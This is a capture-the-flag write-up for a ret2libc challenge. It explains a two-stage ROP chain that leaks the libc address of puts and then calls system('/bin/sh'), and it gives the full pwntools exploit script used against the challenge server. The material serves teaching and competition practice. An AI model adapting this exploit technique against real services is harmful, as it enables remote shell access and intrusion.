This is a ret2libc challenge. It requires the players to know how ROP works (loads of guides out there for it so I won't explain it).

The idea here is for you to construct an initial ROP chain that leaks a libc address. In my exploit's case, I leaked the address of `puts` by performing a ROP chain with the following instructions: `pop rdi` -> `puts@GOT addr` -> `puts@PLT addr` -> `main addr`. This will cause the address of `puts@GOT` (which will contain the libc address for `puts`) to be popped into `rdi`, after which the subsequent `puts` call (from the `puts@PLT addr`) will print this libc address out.

After this is done, execution jumps back to main. The script parses the leak (use https://libc.blukat.me to find offsets), finds the address of `system@LIBC` and the address of the `/bin/sh` string which exists in all libcs. After that, the ROP chain does something similar, except it calls `system("/bin/sh")` instead (the rop chain should be self explanatory if you understand how the original one works).

The only thing to explain then is that seemingly useless `ret` instruction at the beginning of the ROP chain. The reason you need that is to align the stack to 16 bytes. This is a requirement when calling `system` (and some other libc functions, but in this case just `system`). For more information, [check out the Common Pitfalls section in the ROP Emporium beginner's guide](https://ropemporium.com/guide.html).

Final exploit:

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("../publish/return-to-what")

p = remote("chal.duc.tf", 30003)
#p = process("../publish/return-to-what")

main = elf.sym['main']
puts = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x000000000040122b
ret = 0x0000000000401016

payload = b"A"*56 + p64(pop_rdi) + p64(puts_got) + p64(puts) + p64(main)

p.recv()
p.sendline(payload)

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - 0x0809c0
system = libc_base + 0x04f440
bin_sh = libc_base + 0x1b3e9a

log.info("puts@LIBC: " + hex(leak))
log.info("Libc base: " + hex(libc_base))
log.info("system@LIBC: " + hex(system))
log.info("/bin/sh: " + hex(bin_sh))

payload = b"A"*56 + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)

p.recv()
p.sendline(payload)

p.interactive()
```
